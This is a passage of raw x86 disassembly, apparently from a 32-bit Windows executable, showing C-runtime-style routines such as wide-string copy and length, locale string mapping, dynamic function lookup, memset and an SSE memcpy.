  422ba7:	pop    ebp
  422ba8:	ret    
  422ba9:	push   edi
  422baa:	mov    edi,esi
  422bac:	sub    edi,ecx
  422bae:	movzx  eax,WORD PTR [ecx]
  422bb1:	mov    WORD PTR [edi+ecx*1],ax
  422bb5:	lea    ecx,[ecx+0x2]
  422bb8:	test   ax,ax
  422bbb:	je     0x422bc0
  422bbd:	dec    edx
  422bbe:	jne    0x422bae
  422bc0:	xor    eax,eax
  422bc2:	pop    edi
  422bc3:	test   edx,edx
  422bc5:	jne    0x422ba6
  422bc7:	mov    WORD PTR [esi],ax
  422bca:	call   0x41fb32
  422bcf:	push   0x22
  422bd1:	jmp    0x422b9c
  422bd3:	push   ebp
  422bd4:	mov    ebp,esp
  422bd6:	mov    eax,DWORD PTR [ebp+0x8]
  422bd9:	mov    cx,WORD PTR [eax]
  422bdc:	add    eax,0x2
  422bdf:	test   cx,cx
  422be2:	jne    0x422bd9
  422be4:	sub    eax,DWORD PTR [ebp+0x8]
  422be7:	sar    eax,1
  422be9:	dec    eax
  422bea:	pop    ebp
  422beb:	ret    
  422bec:	push   ebp
  422bed:	mov    ebp,esp
  422bef:	mov    edx,DWORD PTR [ebp+0x14]
  422bf2:	mov    ecx,DWORD PTR [ebp+0x8]
  422bf5:	push   esi
  422bf6:	test   edx,edx
  422bf8:	jne    0x422c07
  422bfa:	test   ecx,ecx
  422bfc:	jne    0x422c0b
  422bfe:	cmp    DWORD PTR [ebp+0xc],ecx
  422c01:	jne    0x422c29
  422c03:	xor    eax,eax
  422c05:	jmp    0x422c3a
  422c07:	test   ecx,ecx
  422c09:	je     0x422c29
  422c0b:	mov    eax,DWORD PTR [ebp+0xc]
  422c0e:	test   eax,eax
  422c10:	je     0x422c29
  422c12:	test   edx,edx
  422c14:	jne    0x422c1d
  422c16:	xor    eax,eax
  422c18:	mov    WORD PTR [ecx],ax
  422c1b:	jmp    0x422c03
  422c1d:	mov    esi,DWORD PTR [ebp+0x10]
  422c20:	test   esi,esi
  422c22:	jne    0x422c3d
  422c24:	xor    eax,eax
  422c26:	mov    WORD PTR [ecx],ax
  422c29:	call   0x41fb32
  422c2e:	push   0x16
  422c30:	pop    esi
  422c31:	mov    DWORD PTR [eax],esi
  422c33:	call   0x422622
  422c38:	mov    eax,esi
  422c3a:	pop    esi
  422c3b:	pop    ebp
  422c3c:	ret    
  422c3d:	push   ebx
  422c3e:	mov    ebx,ecx
  422c40:	push   edi
  422c41:	mov    edi,eax
  422c43:	cmp    edx,0xffffffff
  422c46:	jne    0x422c5e
  422c48:	sub    ebx,esi
  422c4a:	movzx  eax,WORD PTR [esi]
  422c4d:	mov    WORD PTR [ebx+esi*1],ax
  422c51:	lea    esi,[esi+0x2]
  422c54:	test   ax,ax
  422c57:	je     0x422c7e
  422c59:	dec    edi
  422c5a:	jne    0x422c4a
  422c5c:	jmp    0x422c7e
  422c5e:	sub    esi,ecx
  422c60:	movzx  eax,WORD PTR [esi+ebx*1]
  422c64:	mov    WORD PTR [ebx],ax
  422c67:	lea    ebx,[ebx+0x2]
  422c6a:	test   ax,ax
  422c6d:	je     0x422c75
  422c6f:	dec    edi
  422c70:	je     0x422c75
  422c72:	dec    edx
  422c73:	jne    0x422c60
  422c75:	test   edx,edx
  422c77:	jne    0x422c7e
  422c79:	xor    eax,eax
  422c7b:	mov    WORD PTR [ebx],ax
  422c7e:	test   edi,edi
  422c80:	pop    edi
  422c81:	pop    ebx
  422c82:	jne    0x422c03
  422c88:	cmp    edx,0xffffffff
  422c8b:	jne    0x422c9c
  422c8d:	mov    eax,DWORD PTR [ebp+0xc]
  422c90:	xor    edx,edx
  422c92:	push   0x50
  422c94:	mov    WORD PTR [ecx+eax*2-0x2],dx
  422c99:	pop    eax
  422c9a:	jmp    0x422c3a
  422c9c:	xor    eax,eax
  422c9e:	mov    WORD PTR [ecx],ax
  422ca1:	call   0x41fb32
  422ca6:	push   0x22
  422ca8:	jmp    0x422c30
  422caa:	push   ebp
  422cab:	mov    ebp,esp
  422cad:	sub    esp,0x24
  422cb0:	mov    eax,ds:0x4314e0
  422cb5:	xor    eax,ebp
  422cb7:	mov    DWORD PTR [ebp-0x4],eax
  422cba:	mov    eax,DWORD PTR [ebp+0x8]
  422cbd:	push   ebx
  422cbe:	mov    ebx,DWORD PTR ds:0x429044
  422cc4:	push   esi
  422cc5:	push   edi
  422cc6:	mov    DWORD PTR [ebp-0x1c],eax
  422cc9:	xor    esi,esi
  422ccb:	mov    eax,DWORD PTR [ebp+0xc]
  422cce:	push   esi
  422ccf:	mov    DWORD PTR [ebp-0x20],eax
  422cd2:	call   ebx
  422cd4:	mov    edi,eax
  422cd6:	mov    DWORD PTR [ebp-0x18],edi
  422cd9:	call   0x421ea0
  422cde:	mov    DWORD PTR [ebp-0x14],eax
  422ce1:	cmp    DWORD PTR ds:0x4327d8,esi
  422ce7:	jne    0x422d9d
  422ced:	push   0x800
  422cf2:	push   esi
  422cf3:	push   0x42afcc
  422cf8:	call   DWORD PTR ds:0x4290e4
  422cfe:	mov    edi,eax
  422d00:	test   edi,edi
  422d02:	jne    0x422d2a
  422d04:	call   DWORD PTR ds:0x429030
  422d0a:	cmp    eax,0x57
  422d0d:	jne    0x422e7d
  422d13:	push   esi
  422d14:	push   esi
  422d15:	push   0x42afcc
  422d1a:	call   DWORD PTR ds:0x4290e4
  422d20:	mov    edi,eax
  422d22:	test   edi,edi
  422d24:	je     0x422e7d
  422d2a:	push   0x42afe4
  422d2f:	push   edi
  422d30:	call   DWORD PTR ds:0x429054
  422d36:	test   eax,eax
  422d38:	je     0x422e7d
  422d3e:	push   eax
  422d3f:	call   ebx
  422d41:	push   0x42aff0
  422d46:	push   edi
  422d47:	mov    ds:0x4327d8,eax
  422d4c:	call   DWORD PTR ds:0x429054
  422d52:	push   eax
  422d53:	call   ebx
  422d55:	push   0x42b000
  422d5a:	push   edi
  422d5b:	mov    ds:0x4327dc,eax
  422d60:	call   DWORD PTR ds:0x429054
  422d66:	push   eax
  422d67:	call   ebx
  422d69:	push   0x42b014
  422d6e:	push   edi
  422d6f:	mov    ds:0x4327e0,eax
  422d74:	call   DWORD PTR ds:0x429054
  422d7a:	push   eax
  422d7b:	call   ebx
  422d7d:	mov    ds:0x4327e8,eax
  422d82:	test   eax,eax
  422d84:	je     0x422d9a
  422d86:	push   0x42b030
  422d8b:	push   edi
  422d8c:	call   DWORD PTR ds:0x429054
  422d92:	push   eax
  422d93:	call   ebx
  422d95:	mov    ds:0x4327e4,eax
  422d9a:	mov    edi,DWORD PTR [ebp-0x18]
  422d9d:	call   DWORD PTR ds:0x4290dc
  422da3:	test   eax,eax
  422da5:	je     0x422dc2
  422da7:	mov    eax,DWORD PTR [ebp-0x1c]
  422daa:	test   eax,eax
  422dac:	je     0x422db5
  422dae:	push   eax
  422daf:	call   DWORD PTR ds:0x4290ec
  422db5:	cmp    DWORD PTR [ebp-0x14],esi
  422db8:	je     0x422dd7
  422dba:	push   0x4
  422dbc:	pop    eax
  422dbd:	jmp    0x422e7f
  422dc2:	cmp    DWORD PTR [ebp-0x14],esi
  422dc5:	je     0x422dd7
  422dc7:	push   DWORD PTR ds:0x4327d8
  422dcd:	call   DWORD PTR ds:0x429048
  422dd3:	push   0x3
  422dd5:	jmp    0x422dbc
  422dd7:	mov    eax,ds:0x4327e4
  422ddc:	mov    ebx,DWORD PTR ds:0x429048
  422de2:	cmp    eax,edi
  422de4:	je     0x422e35
  422de6:	cmp    DWORD PTR ds:0x4327e8,edi
  422dec:	je     0x422e35
  422dee:	push   eax
  422def:	call   ebx
  422df1:	push   DWORD PTR ds:0x4327e8
  422df7:	mov    DWORD PTR [ebp-0x14],eax
  422dfa:	call   ebx
  422dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  422dff:	mov    DWORD PTR [ebp-0x18],eax
  422e02:	test   ecx,ecx
  422e04:	je     0x422e35
  422e06:	test   eax,eax
  422e08:	je     0x422e35
  422e0a:	call   ecx
  422e0c:	test   eax,eax
  422e0e:	je     0x422e2a
  422e10:	lea    ecx,[ebp-0x24]
  422e13:	push   ecx
  422e14:	push   0xc
  422e16:	lea    ecx,[ebp-0x10]
  422e19:	push   ecx
  422e1a:	push   0x1
  422e1c:	push   eax
  422e1d:	call   DWORD PTR [ebp-0x18]
  422e20:	test   eax,eax
  422e22:	je     0x422e2a
  422e24:	test   BYTE PTR [ebp-0x8],0x1
  422e28:	jne    0x422e35
  422e2a:	mov    edi,DWORD PTR [ebp+0x10]
  422e2d:	or     edi,0x200000
  422e33:	jmp    0x422e65
  422e35:	mov    eax,ds:0x4327dc
  422e3a:	cmp    eax,edi
  422e3c:	je     0x422e62
  422e3e:	push   eax
  422e3f:	call   ebx
  422e41:	test   eax,eax
  422e43:	je     0x422e62
  422e45:	call   eax
  422e47:	mov    esi,eax
  422e49:	test   esi,esi
  422e4b:	je     0x422e62
  422e4d:	mov    eax,ds:0x4327e0
  422e52:	cmp    eax,edi
  422e54:	je     0x422e62
  422e56:	push   eax
  422e57:	call   ebx
  422e59:	test   eax,eax
  422e5b:	je     0x422e62
  422e5d:	push   esi
  422e5e:	call   eax
  422e60:	mov    esi,eax
  422e62:	mov    edi,DWORD PTR [ebp+0x10]
  422e65:	push   DWORD PTR ds:0x4327d8
  422e6b:	call   ebx
  422e6d:	test   eax,eax
  422e6f:	je     0x422e7d
  422e71:	push   edi
  422e72:	push   DWORD PTR [ebp-0x20]
  422e75:	push   DWORD PTR [ebp-0x1c]
  422e78:	push   esi
  422e79:	call   eax
  422e7b:	jmp    0x422e7f
  422e7d:	xor    eax,eax
  422e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  422e82:	pop    edi
  422e83:	pop    esi
  422e84:	xor    ecx,ebp
  422e86:	pop    ebx
  422e87:	call   0x421878
  422e8c:	mov    esp,ebp
  422e8e:	pop    ebp
  422e8f:	ret    
  422e90:	push   ebp
  422e91:	mov    ebp,esp
  422e93:	push   ecx
  422e94:	push   ecx
  422e95:	mov    eax,ds:0x4314e0
  422e9a:	xor    eax,ebp
  422e9c:	mov    DWORD PTR [ebp-0x4],eax
  422e9f:	push   ebx
  422ea0:	push   esi
  422ea1:	mov    esi,DWORD PTR [ebp+0x18]
  422ea4:	push   edi
  422ea5:	test   esi,esi
  422ea7:	jle    0x422eca
  422ea9:	mov    eax,DWORD PTR [ebp+0x14]
  422eac:	mov    ecx,esi
  422eae:	dec    ecx
  422eaf:	cmp    BYTE PTR [eax],0x0
  422eb2:	je     0x422ebc
  422eb4:	inc    eax
  422eb5:	test   ecx,ecx
  422eb7:	jne    0x422eae
  422eb9:	or     ecx,0xffffffff
  422ebc:	mov    eax,esi
  422ebe:	sub    eax,ecx
  422ec0:	dec    eax
  422ec1:	cmp    eax,esi
  422ec3:	lea    esi,[eax+0x1]
  422ec6:	jl     0x422eca
  422ec8:	mov    esi,eax
  422eca:	mov    ecx,DWORD PTR [ebp+0x24]
  422ecd:	xor    edi,edi
  422ecf:	test   ecx,ecx
  422ed1:	jne    0x422ee0
  422ed3:	mov    eax,DWORD PTR [ebp+0x8]
  422ed6:	mov    eax,DWORD PTR [eax]
  422ed8:	mov    eax,DWORD PTR [eax+0x4]
  422edb:	mov    ecx,eax
  422edd:	mov    DWORD PTR [ebp+0x24],eax
  422ee0:	xor    eax,eax
  422ee2:	cmp    DWORD PTR [ebp+0x28],eax
  422ee5:	push   0x0
  422ee7:	push   0x0
  422ee9:	push   esi
  422eea:	push   DWORD PTR [ebp+0x14]
  422eed:	setne  al
  422ef0:	lea    eax,[eax*8+0x1]
  422ef7:	push   eax
  422ef8:	push   ecx
  422ef9:	call   DWORD PTR ds:0x429058
  422eff:	mov    ecx,eax
  422f01:	mov    DWORD PTR [ebp-0x8],ecx
  422f04:	test   ecx,ecx
  422f06:	jne    0x422f0f
  422f08:	xor    eax,eax
  422f0a:	jmp    0x423080
  422f0f:	jle    0x422f68
  422f11:	push   0xffffffe0
  422f13:	xor    edx,edx
  422f15:	pop    eax
  422f16:	div    ecx
  422f18:	cmp    eax,0x2
  422f1b:	jb     0x422f68
  422f1d:	add    ecx,ecx
  422f1f:	lea    eax,[ecx+0x8]
  422f22:	cmp    eax,ecx
  422f24:	jbe    0x422f65
  422f26:	mov    eax,DWORD PTR [ebp-0x8]
  422f29:	lea    eax,[eax*2+0x8]
  422f30:	cmp    eax,0x400
  422f35:	ja     0x422f4a
  422f37:	call   0x423e30
  422f3c:	mov    ebx,esp
  422f3e:	test   ebx,ebx
  422f40:	je     0x422f60
  422f42:	mov    DWORD PTR [ebx],0xcccc
  422f48:	jmp    0x422f5d
  422f4a:	push   eax
  422f4b:	call   0x420ac9
  422f50:	mov    ebx,eax
  422f52:	pop    ecx
  422f53:	test   ebx,ebx
  422f55:	je     0x422f60
  422f57:	mov    DWORD PTR [ebx],0xdddd
  422f5d:	add    ebx,0x8
  422f60:	mov    ecx,DWORD PTR [ebp-0x8]
  422f63:	jmp    0x422f6a
  422f65:	mov    ecx,DWORD PTR [ebp-0x8]
  422f68:	xor    ebx,ebx
  422f6a:	test   ebx,ebx
  422f6c:	je     0x422f08
  422f6e:	push   ecx
  422f6f:	push   ebx
  422f70:	push   esi
  422f71:	push   DWORD PTR [ebp+0x14]
  422f74:	push   0x1
  422f76:	push   DWORD PTR [ebp+0x24]
  422f79:	call   DWORD PTR ds:0x429058
  422f7f:	test   eax,eax
  422f81:	je     0x423077
  422f87:	mov    esi,DWORD PTR [ebp-0x8]
  422f8a:	push   0x0
  422f8c:	push   0x0
  422f8e:	push   esi
  422f8f:	push   ebx
  422f90:	push   DWORD PTR [ebp+0x10]
  422f93:	push   DWORD PTR [ebp+0xc]
  422f96:	call   0x423298
  422f9b:	mov    edi,eax
  422f9d:	add    esp,0x18
  422fa0:	test   edi,edi
  422fa2:	je     0x423077
  422fa8:	test   DWORD PTR [ebp+0x10],0x400
  422faf:	je     0x422fdd
  422fb1:	mov    ecx,DWORD PTR [ebp+0x20]
  422fb4:	test   ecx,ecx
  422fb6:	je     0x423077
  422fbc:	cmp    edi,ecx
  422fbe:	jg     0x423077
  422fc4:	push   ecx
  422fc5:	push   DWORD PTR [ebp+0x1c]
  422fc8:	push   esi
  422fc9:	push   ebx
  422fca:	push   DWORD PTR [ebp+0x10]
  422fcd:	push   DWORD PTR [ebp+0xc]
  422fd0:	call   0x423298
  422fd5:	add    esp,0x18
  422fd8:	jmp    0x423077
  422fdd:	test   edi,edi
  422fdf:	jle    0x423030
  422fe1:	push   0xffffffe0
  422fe3:	xor    edx,edx
  422fe5:	pop    eax
  422fe6:	div    edi
  422fe8:	cmp    eax,0x2
  422feb:	jb     0x423030
  422fed:	lea    ecx,[edi+edi*1]
  422ff0:	lea    eax,[ecx+0x8]
  422ff3:	cmp    eax,ecx
  422ff5:	jbe    0x423030
  422ff7:	lea    eax,[edi*2+0x8]
  422ffe:	cmp    eax,0x400
  423003:	ja     0x423018
  423005:	call   0x423e30
  42300a:	mov    esi,esp
  42300c:	test   esi,esi
  42300e:	je     0x423077
  423010:	mov    DWORD PTR [esi],0xcccc
  423016:	jmp    0x42302b
  423018:	push   eax
  423019:	call   0x420ac9
  42301e:	mov    esi,eax
  423020:	pop    ecx
  423021:	test   esi,esi
  423023:	je     0x423077
  423025:	mov    DWORD PTR [esi],0xdddd
  42302b:	add    esi,0x8
  42302e:	jmp    0x423032
  423030:	xor    esi,esi
  423032:	test   esi,esi
  423034:	je     0x423077
  423036:	mov    eax,DWORD PTR [ebp-0x8]
  423039:	push   edi
  42303a:	push   esi
  42303b:	push   eax
  42303c:	push   ebx
  42303d:	push   DWORD PTR [ebp+0x10]
  423040:	push   DWORD PTR [ebp+0xc]
  423043:	call   0x423298
  423048:	add    esp,0x18
  42304b:	test   eax,eax
  42304d:	je     0x423070
  42304f:	xor    eax,eax
  423051:	push   eax
  423052:	push   eax
  423053:	cmp    DWORD PTR [ebp+0x20],eax
  423056:	jne    0x42305c
  423058:	push   eax
  423059:	push   eax
  42305a:	jmp    0x423062
  42305c:	push   DWORD PTR [ebp+0x20]
  42305f:	push   DWORD PTR [ebp+0x1c]
  423062:	push   edi
  423063:	push   esi
  423064:	push   eax
  423065:	push   DWORD PTR [ebp+0x24]
  423068:	call   DWORD PTR ds:0x42905c
  42306e:	mov    edi,eax
  423070:	push   esi
  423071:	call   0x41f110
  423076:	pop    ecx
  423077:	push   ebx
  423078:	call   0x41f110
  42307d:	pop    ecx
  42307e:	mov    eax,edi
  423080:	lea    esp,[ebp-0x14]
  423083:	pop    edi
  423084:	pop    esi
  423085:	pop    ebx
  423086:	mov    ecx,DWORD PTR [ebp-0x4]
  423089:	xor    ecx,ebp
  42308b:	call   0x421878
  423090:	mov    esp,ebp
  423092:	pop    ebp
  423093:	ret    
  423094:	push   ebp
  423095:	mov    ebp,esp
  423097:	push   ecx
  423098:	mov    eax,ds:0x4314e0
  42309d:	xor    eax,ebp
  42309f:	mov    DWORD PTR [ebp-0x4],eax
  4230a2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4230a5:	push   ebx
  4230a6:	push   esi
  4230a7:	push   edi
  4230a8:	xor    edi,edi
  4230aa:	test   ecx,ecx
  4230ac:	jne    0x4230bb
  4230ae:	mov    eax,DWORD PTR [ebp+0x8]
  4230b1:	mov    eax,DWORD PTR [eax]
  4230b3:	mov    eax,DWORD PTR [eax+0x4]
  4230b6:	mov    ecx,eax
  4230b8:	mov    DWORD PTR [ebp+0x1c],eax
  4230bb:	push   edi
  4230bc:	xor    eax,eax
  4230be:	cmp    DWORD PTR [ebp+0x20],eax
  4230c1:	push   edi
  4230c2:	push   DWORD PTR [ebp+0x14]
  4230c5:	setne  al
  4230c8:	push   DWORD PTR [ebp+0x10]
  4230cb:	lea    eax,[eax*8+0x1]
  4230d2:	push   eax
  4230d3:	push   ecx
  4230d4:	call   DWORD PTR ds:0x429058
  4230da:	mov    ebx,eax
  4230dc:	test   ebx,ebx
  4230de:	jne    0x4230e7
  4230e0:	xor    eax,eax
  4230e2:	jmp    0x423178
  4230e7:	jle    0x423134
  4230e9:	cmp    ebx,0x7ffffff0
  4230ef:	ja     0x423134
  4230f1:	lea    ecx,[ebx+ebx*1]
  4230f4:	lea    eax,[ecx+0x8]
  4230f7:	cmp    eax,ecx
  4230f9:	jbe    0x423134
  4230fb:	lea    eax,[ebx*2+0x8]
  423102:	cmp    eax,0x400
  423107:	ja     0x42311c
  423109:	call   0x423e30
  42310e:	mov    esi,esp
  423110:	test   esi,esi
  423112:	je     0x4230e0
  423114:	mov    DWORD PTR [esi],0xcccc
  42311a:	jmp    0x42312f
  42311c:	push   eax
  42311d:	call   0x420ac9
  423122:	mov    esi,eax
  423124:	pop    ecx
  423125:	test   esi,esi
  423127:	je     0x4230e0
  423129:	mov    DWORD PTR [esi],0xdddd
  42312f:	add    esi,0x8
  423132:	jmp    0x423136
  423134:	mov    esi,edi
  423136:	test   esi,esi
  423138:	je     0x4230e0
  42313a:	lea    eax,[ebx+ebx*1]
  42313d:	push   eax
  42313e:	push   edi
  42313f:	push   esi
  423140:	call   0x423190
  423145:	add    esp,0xc
  423148:	push   ebx
  423149:	push   esi
  42314a:	push   DWORD PTR [ebp+0x14]
  42314d:	push   DWORD PTR [ebp+0x10]
  423150:	push   0x1
  423152:	push   DWORD PTR [ebp+0x1c]
  423155:	call   DWORD PTR ds:0x429058
  42315b:	test   eax,eax
  42315d:	je     0x42316f
  42315f:	push   DWORD PTR [ebp+0x18]
  423162:	push   eax
  423163:	push   esi
  423164:	push   DWORD PTR [ebp+0xc]
  423167:	call   DWORD PTR ds:0x4290f8
  42316d:	mov    edi,eax
  42316f:	push   esi
  423170:	call   0x41f110
  423175:	pop    ecx
  423176:	mov    eax,edi
  423178:	lea    esp,[ebp-0x10]
  42317b:	pop    edi
  42317c:	pop    esi
  42317d:	pop    ebx
  42317e:	mov    ecx,DWORD PTR [ebp-0x4]
  423181:	xor    ecx,ebp
  423183:	call   0x421878
  423188:	mov    esp,ebp
  42318a:	pop    ebp
  42318b:	ret    
  42318c:	int3   
  42318d:	int3   
  42318e:	int3   
  42318f:	int3   
  423190:	mov    edx,DWORD PTR [esp+0xc]
  423194:	mov    ecx,DWORD PTR [esp+0x4]
  423198:	test   edx,edx
  42319a:	je     0x42321b
  42319c:	movzx  eax,BYTE PTR [esp+0x8]
  4231a1:	bt     DWORD PTR ds:0x432b24,0x1
  4231a9:	jae    0x4231b8
  4231ab:	mov    ecx,DWORD PTR [esp+0xc]
  4231af:	push   edi
  4231b0:	mov    edi,DWORD PTR [esp+0x8]
  4231b4:	rep stos BYTE PTR es:[edi],al
  4231b6:	jmp    0x423215
  4231b8:	mov    edx,DWORD PTR [esp+0xc]
  4231bc:	cmp    edx,0x80
  4231c2:	jl     0x4231d2
  4231c4:	bt     DWORD PTR ds:0x431580,0x1
  4231cc:	jb     0x423e5c
  4231d2:	push   edi
  4231d3:	mov    edi,ecx
  4231d5:	cmp    edx,0x4
  4231d8:	jb     0x42320b
  4231da:	neg    ecx
  4231dc:	and    ecx,0x3
  4231df:	je     0x4231ed
  4231e1:	sub    edx,ecx
  4231e3:	mov    BYTE PTR [edi],al
  4231e5:	add    edi,0x1
  4231e8:	sub    ecx,0x1
  4231eb:	jne    0x4231e3
  4231ed:	mov    ecx,eax
  4231ef:	shl    eax,0x8
  4231f2:	add    eax,ecx
  4231f4:	mov    ecx,eax
  4231f6:	shl    eax,0x10
  4231f9:	add    eax,ecx
  4231fb:	mov    ecx,edx
  4231fd:	and    edx,0x3
  423200:	shr    ecx,0x2
  423203:	je     0x42320b
  423205:	rep stos DWORD PTR es:[edi],eax
  423207:	test   edx,edx
  423209:	je     0x423215
  42320b:	mov    BYTE PTR [edi],al
  42320d:	add    edi,0x1
  423210:	sub    edx,0x1
  423213:	jne    0x42320b
  423215:	mov    eax,DWORD PTR [esp+0x8]
  423219:	pop    edi
  42321a:	ret    
  42321b:	mov    eax,DWORD PTR [esp+0x4]
  42321f:	ret    
  423220:	push   ebp
  423221:	mov    ebp,esp
  423223:	push   ebx
  423224:	push   esi
  423225:	push   edi
  423226:	xor    edi,edi
  423228:	mov    ebx,0xe3
  42322d:	lea    eax,[ebx+edi*1]
  423230:	cdq    
  423231:	sub    eax,edx
  423233:	mov    esi,eax
  423235:	sar    esi,1
  423237:	push   0x55
  423239:	push   DWORD PTR [esi*8+0x42bf70]
  423240:	push   DWORD PTR [ebp+0x8]
  423243:	call   0x4232e4
  423248:	add    esp,0xc
  42324b:	test   eax,eax
  42324d:	je     0x423262
  42324f:	jns    0x423256
  423251:	lea    ebx,[esi-0x1]
  423254:	jmp    0x423259
  423256:	lea    edi,[esi+0x1]
  423259:	cmp    edi,ebx
  42325b:	jle    0x42322d
  42325d:	or     eax,0xffffffff
  423260:	jmp    0x423269
  423262:	mov    eax,DWORD PTR [esi*8+0x42bf74]
  423269:	pop    edi
  42326a:	pop    esi
  42326b:	pop    ebx
  42326c:	pop    ebp
  42326d:	ret    
  42326e:	push   ebp
  42326f:	mov    ebp,esp
  423271:	cmp    DWORD PTR [ebp+0x8],0x0
  423275:	je     0x423294
  423277:	push   DWORD PTR [ebp+0x8]
  42327a:	call   0x423220
  42327f:	pop    ecx
  423280:	test   eax,eax
  423282:	js     0x423294
  423284:	cmp    eax,0xe4
  423289:	jae    0x423294
  42328b:	mov    eax,DWORD PTR [eax*8+0x42b850]
  423292:	pop    ebp
  423293:	ret    
  423294:	xor    eax,eax
  423296:	pop    ebp
  423297:	ret    
  423298:	push   ebp
  423299:	mov    ebp,esp
  42329b:	mov    eax,ds:0x433bd0
  4232a0:	xor    eax,DWORD PTR ds:0x4314e0
  4232a6:	je     0x4232c3
  4232a8:	xor    ecx,ecx
  4232aa:	push   ecx
  4232ab:	push   ecx
  4232ac:	push   ecx
  4232ad:	push   DWORD PTR [ebp+0x1c]
  4232b0:	push   DWORD PTR [ebp+0x18]
  4232b3:	push   DWORD PTR [ebp+0x14]
  4232b6:	push   DWORD PTR [ebp+0x10]
  4232b9:	push   DWORD PTR [ebp+0xc]
  4232bc:	push   DWORD PTR [ebp+0x8]
  4232bf:	call   eax
  4232c1:	pop    ebp
  4232c2:	ret    
  4232c3:	push   DWORD PTR [ebp+0x1c]
  4232c6:	push   DWORD PTR [ebp+0x18]
  4232c9:	push   DWORD PTR [ebp+0x14]
  4232cc:	push   DWORD PTR [ebp+0x10]
  4232cf:	push   DWORD PTR [ebp+0xc]
  4232d2:	push   DWORD PTR [ebp+0x8]
  4232d5:	call   0x42326e
  4232da:	pop    ecx
  4232db:	push   eax
  4232dc:	call   DWORD PTR ds:0x429024
  4232e2:	pop    ebp
  4232e3:	ret    
  4232e4:	push   ebp
  4232e5:	mov    ebp,esp
  4232e7:	push   esi
  4232e8:	mov    esi,DWORD PTR [ebp+0x10]
  4232eb:	xor    eax,eax
  4232ed:	test   esi,esi
  4232ef:	je     0x42334f
  4232f1:	mov    ecx,DWORD PTR [ebp+0xc]
  4232f4:	push   ebx
  4232f5:	push   edi
  4232f6:	mov    edi,DWORD PTR [ebp+0x8]
  4232f9:	push   0x41
  4232fb:	pop    ebx
  4232fc:	push   0x5a
  4232fe:	pop    edx
  4232ff:	sub    edi,ecx
  423301:	mov    DWORD PTR [ebp+0x10],edx
  423304:	jmp    0x423309
  423306:	push   0x5a
  423308:	pop    edx
  423309:	movzx  eax,WORD PTR [edi+ecx*1]
  42330d:	cmp    ax,bx
  423310:	jb     0x42331f
  423312:	cmp    ax,dx
  423315:	ja     0x42331f
  423317:	add    eax,0x20
  42331a:	movzx  edx,ax
  42331d:	jmp    0x423321
  42331f:	mov    edx,eax
  423321:	movzx  eax,WORD PTR [ecx]
  423324:	cmp    ax,bx
  423327:	jb     0x423335
  423329:	cmp    ax,WORD PTR [ebp+0x10]
  42332d:	ja     0x423335
  42332f:	add    eax,0x20
  423332:	movzx  eax,ax
  423335:	add    ecx,0x2
  423338:	dec    esi
  423339:	je     0x423345
  42333b:	test   dx,dx
  42333e:	je     0x423345
  423340:	cmp    dx,ax
  423343:	je     0x423306
  423345:	movzx  ecx,ax
  423348:	movzx  eax,dx
  42334b:	pop    edi
  42334c:	sub    eax,ecx
  42334e:	pop    ebx
  42334f:	pop    esi
  423350:	pop    ebp
  423351:	ret    
  423352:	int3   
  423353:	int3   
  423354:	int3   
  423355:	int3   
  423356:	int3   
  423357:	int3   
  423358:	int3   
  423359:	int3   
  42335a:	int3   
  42335b:	int3   
  42335c:	int3   
  42335d:	int3   
  42335e:	int3   
  42335f:	int3   
  423360:	push   edi
  423361:	push   esi
  423362:	mov    esi,DWORD PTR [esp+0x10]
  423366:	mov    ecx,DWORD PTR [esp+0x14]
  42336a:	mov    edi,DWORD PTR [esp+0xc]
  42336e:	mov    eax,ecx
  423370:	mov    edx,ecx
  423372:	add    eax,esi
  423374:	cmp    edi,esi
  423376:	jbe    0x423380
  423378:	cmp    edi,eax
  42337a:	jb     0x4236e8
  423380:	bt     DWORD PTR ds:0x432b24,0x1
  423388:	jae    0x423391
  42338a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42338c:	jmp    0x4236a8
  423391:	cmp    ecx,0x80
  423397:	jb     0x42356b
  42339d:	mov    eax,edi
  42339f:	xor    eax,esi
  4233a1:	test   eax,0xf
  4233a6:	jne    0x4233b6
  4233a8:	bt     DWORD PTR ds:0x431580,0x1
  4233b0:	jb     0x423890
  4233b6:	bt     DWORD PTR ds:0x432b24,0x0
  4233be:	jae    0x42356b
  4233c4:	test   edi,0x3
  4233ca:	jne    0x423588
  4233d0:	test   esi,0x3
  4233d6:	jne    0x423573
  4233dc:	bt     edi,0x2
  4233e0:	jae    0x4233ef
  4233e2:	mov    eax,DWORD PTR [esi]
  4233e4:	sub    ecx,0x4
  4233e7:	lea    esi,[esi+0x4]
  4233ea:	mov    DWORD PTR [edi],eax
  4233ec:	lea    edi,[edi+0x4]
  4233ef:	bt     edi,0x3
  4233f3:	jae    0x423406
  4233f5:	movq   xmm1,QWORD PTR [esi]
  4233f9:	sub    ecx,0x8
  4233fc:	lea    esi,[esi+0x8]
  4233ff:	movq   QWORD PTR [edi],xmm1
  423403:	lea    edi,[edi+0x8]
  423406:	test   esi,0x7
  42340c:	je     0x423471
  42340e:	bt     esi,0x3
  423412:	jae    0x4234ca
  423418:	movdqa xmm1,XMMWORD PTR [esi-0xc]
  42341d:	lea    esi,[esi-0xc]
  423420:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  423425:	sub    ecx,0x30
  423428:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  42342d:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  423432:	lea    esi,[esi+0x30]
  423435:	cmp    ecx,0x30
  423438:	movdqa xmm2,xmm3
  42343c:	palignr xmm3,xmm1,0xc
  423442:	movdqa XMMWORD PTR [edi],xmm3
  423446:	movdqa xmm4,xmm0
  42344a:	palignr xmm0,xmm2,0xc
  423450:	movdqa XMMWORD PTR [edi+0x10],xmm0
  423455:	movdqa xmm1,xmm5
  423459:	palignr xmm5,xmm4,0xc
  42345f:	movdqa XMMWORD PTR [edi+0x20],xmm5
  423464:	lea    edi,[edi+0x30]
  423467:	jge    0x423420
  423469:	lea    esi,[esi+0xc]
  42346c:	jmp    0x423520
  423471:	movdqa xmm1,XMMWORD PTR [esi-0x8]
  423476:	lea    esi,[esi-0x8]
  423479:	lea    ecx,[ecx+0x0]
  42347c:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  423481:	sub    ecx,0x30
  423484:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  423489:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  42348e:	lea    esi,[esi+0x30]
  423491:	cmp    ecx,0x30
